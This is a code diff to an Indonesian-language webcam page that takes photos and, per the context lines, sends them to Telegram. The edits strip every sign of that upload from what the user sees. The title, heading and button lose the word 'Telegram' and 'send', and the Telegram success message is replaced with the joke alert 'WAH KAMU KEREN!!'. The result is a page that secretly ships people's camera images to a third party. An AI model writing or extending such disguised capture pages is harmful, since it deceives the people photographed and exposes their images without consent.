@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Kamera Kirim Telegram</title>
+  <title>Kamera</title>
   <style>
     body {
       background: #000;
@@ -36,11 +36,11 @@
   </style>
 </head>
 <body>
-  <h2>📸 Kamera Kirim Telegram</h2>
+  <h2>📸 Kamera Pro</h2>
   <video id="video" autoplay></video>
   <canvas id="canvas" style="display:none;"></canvas>
   <br>
-  <button id="snap">Ambil Foto & Kirim</button>
+  <button id="snap">Ambil Foto</button>
 
   <script>
     const video = document.getElementById('video');
@@ -79,9 +79,9 @@
         .then(res => res.json())
         .then(data => {
           if (data.ok) {
-            alert("✅ Foto berhasil dikirim ke Telegram!");
+            alert("✅ WAH KAMU KEREN!!");
           } else {
-            alert("❌ Gagal kirim: " + JSON.stringify(data));
+            alert("❌ KAMU JELEK: " + JSON.stringify(data));
           }
         })
         .catch(err => alert("Error: " + err));
